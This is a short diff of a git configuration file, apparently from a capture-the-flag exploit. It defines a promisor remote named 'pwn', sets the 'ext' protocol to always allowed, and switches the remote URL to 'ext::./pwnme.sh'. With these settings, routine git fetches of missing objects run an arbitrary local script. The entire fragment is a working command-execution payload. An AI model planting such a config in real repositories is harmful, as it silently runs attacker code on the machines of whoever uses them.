@@ -6,7 +6,7 @@
     partialClone = pwn
 [remote "pwn"]
     promisor = true
-    url = "ext::/flagout"
+    url = "ext::./pwnme.sh"
 
 [protocol "ext"]
     allow = always
